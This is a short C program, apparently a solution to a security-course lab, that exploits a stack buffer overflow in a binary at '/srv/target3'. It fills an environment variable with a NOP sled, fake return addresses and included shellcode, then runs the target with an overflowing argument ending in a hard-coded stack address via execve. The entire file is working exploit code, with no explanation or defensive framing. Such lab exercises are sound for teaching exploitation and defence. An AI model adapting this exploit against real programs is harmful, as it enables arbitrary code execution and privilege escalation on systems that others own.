#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

const int ENV_SIZE = 400;
const int NOP_SIZE = 201;
const uint32_t BASE_ADDR = 0xffffdec0;
const int RET_OFFSET = 4;

void prepareEnvironment(char *env) {
    memset(env, 0x90, ENV_SIZE - 1);
    *((uint32_t *)(env)) = BASE_ADDR + RET_OFFSET;
    *((uint32_t *)(env + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
    memcpy(env + NOP_SIZE, shellcode, sizeof(shellcode));
    env[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *args[3];
    char *envp[1];
    char env[ENV_SIZE];

    prepareEnvironment(env);

    args[0] = TARGET;
    args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
    args[2] = NULL;

    envp[0] = env;

    execve(TARGET, args, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}